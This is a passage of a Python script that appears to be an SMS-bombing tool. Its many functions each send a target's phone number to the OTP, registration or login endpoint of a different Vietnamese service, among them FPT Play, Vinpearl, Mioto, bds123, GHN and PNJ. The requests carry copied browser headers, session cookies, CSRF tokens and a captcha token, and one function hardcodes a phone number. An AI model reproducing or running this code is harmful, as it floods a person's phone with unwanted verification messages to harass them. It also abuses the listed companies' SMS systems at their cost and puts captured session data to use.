    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}

   json_data = {
    'phone': phone,
}

   response = requests.post('https://auth.medigoapp.com/prod/getOtp', headers=headers, json=json_data)
def fptplay(phone):
   headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'content-type': 'application/json; charset=UTF-8',
    'origin': 'https://fptplay.vn',
    'priority': 'u=1, i',
    'referer': 'https://fptplay.vn/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'x-did': 'CB10CE01EA13622F',
}

   json_data = {
    'phone': phone,
    'country_code': 'VN',
    'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
}

   response = requests.post(
    'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=pp8g343UZxj9g1vgy-gcOA&e=1723271548&device=Chrome(version%253A127.0.0.0)&drm=1',
    headers=headers,
    json=json_data,
)
def vinpearl(phone):
   headers = {
    'accept': 'application/json',
    'accept-language': 'vi-VN',
    'access-control-allow-headers': 'Accept, X-Requested-With, Content-Type, Authorization, Access-Control-Allow-Headers',
    'authorization': 'Bearer undefined',
    'content-type': 'application/json',
    'origin': 'https://booking.vinpearl.com',
    'priority': 'u=1, i',
    'referer': 'https://booking.vinpearl.com/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'x-display-currency': 'VND',
}

   json_data = {
    'channel': 'vpt',
    'username': phone,
    'type': 1,
    'OtpChannel': 1,
}

   response = requests.post(
    'https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp',
    headers=headers,
    json=json_data,
)
def rich(phone):
   cookies = {
    'PHPSESSID': '04b9dr3ghrfef6vrks06v8bb02',
    'form_key': 'z4LNRXM23ah8smI1',
    'mage-cache-storage': '%7B%7D',
    'mage-cache-storage-section-invalidation': '%7B%7D',
    'mage-cache-sessid': 'true',
    '_gid': 'GA1.3.1961939476.1723173538',
    '_gat': '1',
    'form_key': 'z4LNRXM23ah8smI1',
    'mage-messages': '',
    'recently_viewed_product': '%7B%7D',
    'recently_viewed_product_previous': '%7B%7D',
    'recently_compared_product': '%7B%7D',
    'recently_compared_product_previous': '%7B%7D',
    'product_data_storage': '%7B%7D',
    'mgn_location_popup': 'hcmc',
    'X-Magento-Vary': '5af667c6bab2aa610dedd1a1b31a2bc973082a33',
    '_ga_ERJHC2DBNR': 'GS1.1.1723173536.1.1.1723173543.53.0.0',
    '_ga_YJCKSVZ38K': 'GS1.1.1723173536.1.1.1723173543.0.0.0',
    '_ga': 'GA1.3.1436578517.1723173537',
    'private_content_version': '1d584b89ea88d4dfef0817d1182d49bd',
    'section_data_ids': '%7B%7D',
}

   headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'PHPSESSID=04b9dr3ghrfef6vrks06v8bb02; form_key=z4LNRXM23ah8smI1; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; _gid=GA1.3.1961939476.1723173538; _gat=1; form_key=z4LNRXM23ah8smI1; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mgn_location_popup=hcmc; X-Magento-Vary=5af667c6bab2aa610dedd1a1b31a2bc973082a33; _ga_ERJHC2DBNR=GS1.1.1723173536.1.1.1723173543.53.0.0; _ga_YJCKSVZ38K=GS1.1.1723173536.1.1.1723173543.0.0.0; _ga=GA1.3.1436578517.1723173537; private_content_version=1d584b89ea88d4dfef0817d1182d49bd; section_data_ids=%7B%7D',
    'Origin': 'https://shop.richs.com.vn',
    'Referer': 'https://shop.richs.com.vn/customer/account/create/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

   data = {
    'phone_number': phone,
}

   response = requests.post('https://shop.richs.com.vn/phone/account/phonecode/', cookies=cookies, headers=headers, data=data)
def pico(ohone):
   headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi',
    'access': '206f5b6838b4e357e98bf68dbb8cdea5',
    'channel': 'b2c',
    'content-type': 'application/json',
    'origin': 'https://pico.vn',
    'party': 'ecom',
    'platform': 'Desktop',
    'priority': 'u=1, i',
    'referer': 'https://pico.vn/',
    'region-code': 'MB',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'uuid': '159516baf10d4c5ab3ec9d62dc214b1b',
}

   json_data = {
    'phone': phone,
}

   response = requests.post('https://auth.pico.vn/user/api/auth/login/request-otp', headers=headers, json=json_data)

def lie(phone):
   cookies = {
    'form_key': 'uA6kOmKlagg4bbHj',
    'mage-cache-storage': '{}',
    'mage-cache-storage-section-invalidation': '{}',
    'mage-cache-sessid': 'true',
    'recently_viewed_product': '{}',
    'recently_viewed_product_previous': '{}',
    'recently_compared_product': '{}',
    'recently_compared_product_previous': '{}',
    'product_data_storage': '{}',
    'mage-messages': '',
    'PHPSESSID': '7b3d13efa2773b86d84fe7dc9a07215f',
    '_gcl_au': '1.1.1175078766.1723172173',
    '_gid': 'GA1.3.697666992.1723172173',
    '_gac_UA-10523984-2': '1.1723172173.CjwKCAjw2dG1BhB4EiwA998cqBIppNezxIIdGSW5ExcxYfjuEcUXbfGNDAF1X3zsYN8vfJgdy1DAphoCpS0QAvD_BwE',
    '_tt_enable_cookie': '1',
    '_ttp': 'hDUvt0RTxPPEwT1WPlQDLBvBhyK',
    '_gcl_aw': 'GCL.1723172212.CjwKCAjw2dG1BhB4EiwA998cqBIppNezxIIdGSW5ExcxYfjuEcUXbfGNDAF1X3zsYN8vfJgdy1DAphoCpS0QAvD_BwE',
    '_gcl_gs': '2.1.k1$i1723172211',
    '_ga_EG96D1Q288': 'GS1.1.1723172173.1.1.1723172212.21.0.0',
    '_ga': 'GA1.3.1993177176.1723172173',
    'form_key': 'uA6kOmKlagg4bbHj',
    'section_data_ids': '{}',
}

   headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'content-type': 'application/json',
    # 'cookie': 'form_key=uA6kOmKlagg4bbHj; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; PHPSESSID=7b3d13efa2773b86d84fe7dc9a07215f; _gcl_au=1.1.1175078766.1723172173; _gid=GA1.3.697666992.1723172173; _gac_UA-10523984-2=1.1723172173.CjwKCAjw2dG1BhB4EiwA998cqBIppNezxIIdGSW5ExcxYfjuEcUXbfGNDAF1X3zsYN8vfJgdy1DAphoCpS0QAvD_BwE; _tt_enable_cookie=1; _ttp=hDUvt0RTxPPEwT1WPlQDLBvBhyK; _gcl_aw=GCL.1723172212.CjwKCAjw2dG1BhB4EiwA998cqBIppNezxIIdGSW5ExcxYfjuEcUXbfGNDAF1X3zsYN8vfJgdy1DAphoCpS0QAvD_BwE; _gcl_gs=2.1.k1$i1723172211; _ga_EG96D1Q288=GS1.1.1723172173.1.1.1723172212.21.0.0; _ga=GA1.3.1993177176.1723172173; form_key=uA6kOmKlagg4bbHj; section_data_ids={}',
    'origin': 'https://www.liena.com.vn',
    'priority': 'u=1, i',
    'referer': 'https://www.liena.com.vn/la-customer/register',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

   json_data = {
    'phone_number': phone,
}

   response = requests.post(
    'https://www.liena.com.vn/rest/V1/liena/customer/registration/request',
   cookies=cookies,
   headers=headers,
   json=json_data,
)
def aji(phone):
   headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'Connection': 'keep-alive',
    # 'Content-Length': '0',
    'Origin': 'https://dinhduongmevabe.com.vn',
    'Referer': 'https://dinhduongmevabe.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

   params = {
    'userName': phone,
}

   response = requests.post('https://api.dinhduongmevabe.com.vn/api/User/GetVerifyPhoneNumberCode', params=params, headers=headers)
def mio(phone):
   cookies = {
    '_utm_src': 'google_search',
    '_utm_campaign': 'HCM_popular',
    '_utm_medium': 'cpc',
    '_utm_term': 'self_driver',
    '_vid': 'anoO0APTDZu8Yhkx',
    '_hv': 'b4e1bf5ad13d34ecdf89aded893c1b5219e6ab04111886a36a257b9632f269b3',
    '_gcl_aw': 'GCL.1723171407.CjwKCAjw2dG1BhB4EiwA998cqKh3JDZhh42ikVLAa_y4HnBwbMiPfsrA2ZyWVD56curTIKXQifWB9RoC5e4QAvD_BwE',
    '_gcl_gs': '2.1.k1$i1723171406',
    '_gcl_au': '1.1.1342151403.1723171407',
    '_ga': 'GA1.1.1689852820.1723171407',
    '_hs': '581f2d6c98ddfd2a4e4f6b00c4e801f4d1f12a04624cedf7179d254b71b9aafb',
    '_ga_69J768NCYT': 'GS1.1.1723171407.1.1.1723171493.60.0.0',
    '_ga_ZYXJJRHCTB': 'GS1.1.1723171407.1.1.1723171493.0.0.0',
}

   headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    # 'content-length': '0',
    # 'cookie': '_utm_src=google_search; _utm_campaign=HCM_popular; _utm_medium=cpc; _utm_term=self_driver; _vid=anoO0APTDZu8Yhkx; _hv=b4e1bf5ad13d34ecdf89aded893c1b5219e6ab04111886a36a257b9632f269b3; _gcl_aw=GCL.1723171407.CjwKCAjw2dG1BhB4EiwA998cqKh3JDZhh42ikVLAa_y4HnBwbMiPfsrA2ZyWVD56curTIKXQifWB9RoC5e4QAvD_BwE; _gcl_gs=2.1.k1$i1723171406; _gcl_au=1.1.1342151403.1723171407; _ga=GA1.1.1689852820.1723171407; _hs=581f2d6c98ddfd2a4e4f6b00c4e801f4d1f12a04624cedf7179d254b71b9aafb; _ga_69J768NCYT=GS1.1.1723171407.1.1.1723171493.60.0.0; _ga_ZYXJJRHCTB=GS1.1.1723171407.1.1.1723171493.0.0.0',
    'origin': 'https://www.mioto.vn',
    'priority': 'u=1, i',
    'referer': 'https://www.mioto.vn/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}

   params = {
    'phone': phone,
    'action': '2',
    'otpBy': '0',
}

   response = requests.post('https://accounts.mioto.vn/mapi/phone/otp/gen', params=params, cookies=cookies, headers=headers)
def bds(phone):
   cookies = {
    '_gid': 'GA1.2.1983671431.1723171050',
    '_gat_gtag_UA_61644228_3': '1',
    'app_version': 'eyJpdiI6ImJ5TXV5bzVaeXVvbUwxSGZCcHpoZGc9PSIsInZhbHVlIjoiQ0lERnFYWjUvUS9kL1owdmQ0QStkZUZaQ1JmK015d3dUTGhYT2F6N0V2RWhNbERrZVgzMSs4SG9ya1ZxVWRRbyIsIm1hYyI6IjMyMDBlZjJhY2UyZDU5ZDc4ZWE1ZjVjNWYzMjI5NDA0NDM0YjE4Y2NjZDA0ZjgwYzAzNTU3NTkzOTlmODQzMDciLCJ0YWciOiIifQ%3D%3D',
    '_ga': 'GA1.1.2086274722.1723171050',
    'TawkConnectionTime': '0',
    'twk_uuid_5cda768ad07d7e0c63937723': '%7B%22uuid%22%3A%221.PUqAQHvuSb8GNaaYRM53jL4WkeTMqbYYbTBxSTzTB4pHItLNYzr8mn8fQ5IYq6ZklVdcbVnj6o0wwBXrjwcsMEseCC3CgEqjpLpktzwtrnvrurG2G%22%2C%22version%22%3A3%2C%22domain%22%3A%22bds123.vn%22%2C%22ts%22%3A1723171052785%7D',
    'XSRF-TOKEN': 'eyJpdiI6IkpWWUVVUG5OcEc0VUNDZWEyTzhHK0E9PSIsInZhbHVlIjoiTUphRjUycGR0eEFtbzRVa29BdWJkeUw0ZkhJN0lYTjIxSXNxcWNvWUJibjRKS0FwVFNFeFdUaTVRaXlLdVNnU3ZFUUN6M0dsYjNvL1Nnc3RUV2t3U2JUSm5Tc1Q1a1VLODB6aDBNcDRYUzN2UWNyN09SRTFtYVV2TmhCeTZFQUIiLCJtYWMiOiI0ZGI5YWU1NjY5MTIxOTQwMTBlYjI3NjcyNzlhNTFiMjhlNjIzNTQ1MzkyOWUyMjljYThhYjI0YTc4YzU4YmViIiwidGFnIjoiIn0%3D',
    'bds123': 'fd12ZhmQfcOjeSuC2a1Mo4JWXaNwSHJZLD5OMRHr',
    '_ga_M7CCJGF805': 'GS1.1.1723171050.1.1.1723171087.0.0.0',
}

   headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_gid=GA1.2.1983671431.1723171050; _gat_gtag_UA_61644228_3=1; app_version=eyJpdiI6ImJ5TXV5bzVaeXVvbUwxSGZCcHpoZGc9PSIsInZhbHVlIjoiQ0lERnFYWjUvUS9kL1owdmQ0QStkZUZaQ1JmK015d3dUTGhYT2F6N0V2RWhNbERrZVgzMSs4SG9ya1ZxVWRRbyIsIm1hYyI6IjMyMDBlZjJhY2UyZDU5ZDc4ZWE1ZjVjNWYzMjI5NDA0NDM0YjE4Y2NjZDA0ZjgwYzAzNTU3NTkzOTlmODQzMDciLCJ0YWciOiIifQ%3D%3D; _ga=GA1.1.2086274722.1723171050; TawkConnectionTime=0; twk_uuid_5cda768ad07d7e0c63937723=%7B%22uuid%22%3A%221.PUqAQHvuSb8GNaaYRM53jL4WkeTMqbYYbTBxSTzTB4pHItLNYzr8mn8fQ5IYq6ZklVdcbVnj6o0wwBXrjwcsMEseCC3CgEqjpLpktzwtrnvrurG2G%22%2C%22version%22%3A3%2C%22domain%22%3A%22bds123.vn%22%2C%22ts%22%3A1723171052785%7D; XSRF-TOKEN=eyJpdiI6IkpWWUVVUG5OcEc0VUNDZWEyTzhHK0E9PSIsInZhbHVlIjoiTUphRjUycGR0eEFtbzRVa29BdWJkeUw0ZkhJN0lYTjIxSXNxcWNvWUJibjRKS0FwVFNFeFdUaTVRaXlLdVNnU3ZFUUN6M0dsYjNvL1Nnc3RUV2t3U2JUSm5Tc1Q1a1VLODB6aDBNcDRYUzN2UWNyN09SRTFtYVV2TmhCeTZFQUIiLCJtYWMiOiI0ZGI5YWU1NjY5MTIxOTQwMTBlYjI3NjcyNzlhNTFiMjhlNjIzNTQ1MzkyOWUyMjljYThhYjI0YTc4YzU4YmViIiwidGFnIjoiIn0%3D; bds123=fd12ZhmQfcOjeSuC2a1Mo4JWXaNwSHJZLD5OMRHr; _ga_M7CCJGF805=GS1.1.1723171050.1.1.1723171087.0.0.0',
    'origin': 'https://bds123.vn',
    'priority': 'u=1, i',
    'referer': 'https://bds123.vn/xac-thuc-tai-khoan.html?ref=aHR0cHM6Ly9iZHMxMjMudm4vZGFzaGJvYXJkL2luZGV4Lmh0bWw=&f=r',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'x-csrf-token': 'DNonI666BRqnZ63ev71s16wE1TjCSRmttMcKzNeS',
    'x-requested-with': 'XMLHttpRequest',
}

   data = {
    'phone_or_email': phone,
    'action': 'verify',
}

   response = requests.post('https://bds123.vn/api/user/send-token', cookies=cookies, headers=headers, data=data)
def circa(phone):
   headers = {
    'accept': '*/*',
    'accept-language': 'vi-VN',
    'authorization': '',
    'content-type': 'application/json',
    'grpc-timeout': '30S',
    'origin': 'https://circa.vn',
    'priority': 'u=1, i',
    'referer': 'https://circa.vn/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}

   json_data = {
    'phone': {
        'country_code': '84',
        'phone_number': phone,
    },
    'token': '03AFcWeA4nfAkyAHaOFFVulD1EVUjCG5sorAwykd6FZiMMkgsaYO_XX_ojm02woasr1MnVCMqJVhbe1ppgUwggW125b_jHirND4j3CgPupLbivZ9kaXTtmIiu_3_ZOy3454MZY6hvxBfHvHQ3R5YxyXtE31AXPzcYV0Iau01pg396KOXu_TJx5RaQTA2ScZ2hmUKintSg_Efhc0TYKspAYvTWvVFMKL53_vrXZmNH1eZTqCTn3igzzLEpsnE8nssWSgpZ0retI7krssDcwzKrTYs-3EpTujFFa5KvgSXyFIPKIXFRFfAitAw9vBTjNuDDqVvANMUNtw-4AHpMt2VKARuacZtq4lm5j2zZnYBUvFG_Cyy2xfH1EweXbUK3QzkJBifm5e4-bMJwJjmns_LcPQQfegdNayvwjzNkvK7xLLfLPy0DeiahaOUts7kXLaW34k0BPYsKbPBjBhj-Ccv00367QRfGUz_ef2J3vAG0OyaPVW9D3C8eGD-C4V-AFh3Mu9T1smPvVTaz_Iw_Yvbnz4uBzkxE0uFcBlxoF-UN9hVBT9X_NNYx8sSdg4KR38e1U6P7Lh1vQSsG0NMBs0CR-BfVhezkUBeknkhDkjZcE_rU9oTZ10yDS4QVA_gZHzYspBGZgOIRj5q7MN8w4tsDuGy23mxVMQ1eoEfNsMM5jjbISJo1Fikmyv82GIgWPi8BfORSyHfnel6tKg9GCfzI0BIoTs1nBk4ec_T15yUlsbK9xJNU9yfvb3ThTWL_FMDhrPaRkDrhtvLUxqOSuMS0LAmLgfjL10IoumCsACJv8uCktR9oGsf6N7DHYYRkPbsJXwUw1-gq5HBIuM1hvwMhsF_BnVF82ZrFCqO0UX2e-DH9B-qLpHPhP6PWaaTGb3kpz5B0NdUkwg4B3lQrt2pJfQUeVnjZQfCK2HZt6xZJOXGdBJv-_Qi3MydXbtO0At9zYguDsjCoesL2rn8FQuF5r-QoRfYpaYhdyvdBfSHk9haTQzgqQY0i5TPgh41lgVRtDgzQdr6VwAQSDr_6JxA71gIylX1o3OdbQFIrQxyR_LMadv8fI9YA55ioWXVxNGvigYTw1n8u57GY1PBYpEGDqHShWjNm64WDFKDo0_DOXX29bUJWcyN32rDZdd3sc962KEpHEq1_RMrKHRwlXfv-j_KhY1-gL-CSYohfU7XsM__oREN4uM2Q-_8mkp_o2coqnRWA180kKIREBiWXJgaAVveKZ0MMOKoeQvxvMTwikiW40gw5_c178KusbQXxJ9-Sac1S2vVhOF8QfnEnvKLxU7eyvLkfSHyPiLNPReF-3hAm30ccIBaoDjfjzKnrZwk11RxOLT3Z0loJq6xDiPc6iDaOEBDcixN1gc1T6H7l-TCwtoqD3k_dK0aXmiV2MpHHmRcP162YmzAU-1AnTZrZsGCt1-rVJybs6g3l7X0Ov3YJNrRpD32KFlin_GZLlk5YbV8u3csSl2w9B2QL25qAIwcUGPQdSBTBd0TM4E_y2eBw6K2kaBZ1rEfWCHV4AoUKpAwWXJ6m6Hp7c1150ZlfazR3PomUTlKaDKYJRIpKu7CAfgDYj9U56H0EjlYvgOOlU4ubHprmmGTPU-epJaiJ4IPDpidVLoZfZzSs-Fv6lEMkzx0fxQlBCKAG_Fo8QmI43INkKc9yJVsnmX-kATNPvV3UxdUTd61ZCZuzVEWAl4t8siDfMNj8oE9KtFnOPiMHqhyw0HUf5dr_jqLldcwd65XNlkwiGgpd6leQ4cs9PCkIgtQDzReRX2_wT9fUIAiDmmbyMfZEcLiI2P8R837Znr3GHImVKVryqhbY816iLYoWNSkWrhHtcsvblkYP5Zp7NvdK-a-sy0T_U87A7p1lRjEBgxA7piy6EALHDc49WV_pV7ADmFpLEswU',
}

   response = requests.post('https://api.circa.vn/v1/entity/validation-phone', headers=headers, json=json_data)
def ghnexp(phone):
   headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'content-type': 'application/json',
    'origin': 'https://sso.ghn.vn',
    'priority': 'u=1, i',
    'referer': 'https://sso.ghn.vn/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}
   json_data = {
    'phone': '0987895305',
    'type': 'register',
}

   response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data)
def tiniworld(phone):
   cookies = {
    'connect.sid': 's%3AUKNK-rfteUt00wO2H4z6JfxxyGr4SYXe.Sc3%2FZ9DPQ0i6TMvbpPe6etBGSw8Daacyp1FqZCJZY6M',
}

   headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'connect.sid=s%3AUKNK-rfteUt00wO2H4z6JfxxyGr4SYXe.Sc3%2FZ9DPQ0i6TMvbpPe6etBGSw8Daacyp1FqZCJZY6M',
    'origin': 'https://prod-tini-id.nkidworks.com',
    'priority': 'u=0, i',
    'referer': 'https://prod-tini-id.nkidworks.com/login?clientId=609168b9f8d5275ea1e262d6&requiredLogin=true&redirectUrl=https://tiniworld.com',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}

   data = {
    '_csrf': '',
    'clientId': '609168b9f8d5275ea1e262d6',
    'redirectUrl': 'https://tiniworld.com',
    'phone': phone,
}

   response = requests.post('https://prod-tini-id.nkidworks.com/auth/tinizen', cookies=cookies, headers=headers, data=data)
def acheckin(phone):
   headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'access-control-allow-origin': '*',
    'authorization': 'undefined',
    'content-type': 'application/json',
    'locale': 'vi-VN',
    'origin': 'https://hrm.acheckin.io',
    'priority': 'u=1, i',
    'referer': 'https://hrm.acheckin.io/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'x-workspace-host': 'hrm.acheckin.io',
}

   params = {
    'search': phone,
}

   response = requests.get(
    'https://api-gateway.acheckin.io/v1/external/auth/check-existed-account',
    params=params,
    headers=headers,
)
def pnj(phone):
   headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'cookie': '_cdp_user_new; _atm_objs=eyJzb3VyY2UiOiJvcG1fbm91c2Ffc2hvcHBpbmdfYWRzIiwibWVkaXVtIjoiY3BjIiwiY2FtcGFp%0D%0AZ24iOiJwbWF4LWdvbGQiLCJjb250ZW50IjoiIiwidGVybSI6IiIsInR5cGUiOiJhc3NvY2lhdGVf%0D%0AdXRtIiwiY2hlY2tzdW0iOiIqIiwidGltZSI6MTcyMzExMTg5NDIwNH0%3D; _pk_ref.564990245.4a15=%5B%22pmax-gold%22%2C%22%22%2C1723111894%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.564990245.4a15=*; CDPI_VISITOR_ID=264b424c-578a-4265-ae0e-73e7f9c445b6; CDPI_RETURN=New; CDPI_SESSION_ID=1f30e4f5-9ecd-43a9-8f3c-136fd23973a8; _cdp_fsid=2263478188876597; _asm_visitor_type=n; au_id=1576926415; _ac_au_gt=1723111895585; _cdp_cfg=1; _gcl_au=1.1.263099741.1723111894; cdp_session=1; _asm_uid=1576926415; utm_notifications=%7B%22utm_source%22%3A%22opm_nousa_shopping_ads%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_content%22%3A%22%22%2C%22utm_campaign%22%3A%22pmax-gold%22%2C%22aff_sid%22%3A%22%22%7D; _gid=GA1.3.2016393453.1723111895; _gat_UA-26000195-1=1; mp_version_change=4.3.4.2044; _tt_enable_cookie=1; _ttp=hdximspfCm-okdlIB3O4o3-fLf2; _clck=1s0w1yv%7C2%7Cfo5%7C0%7C1681; sid_customer_1f31a=493f941b60de3dc81fb410d2b9a7554f-C; _gac_UA-26000195-1=1.1723111896.CjwKCAjw2dG1BhB4EiwA998cqH9UrhNb3v3mY6CCTprx6uvWZVeth2J_-cOPdltAn2NoHqAoivhahxoCU2UQAvD_BwE; 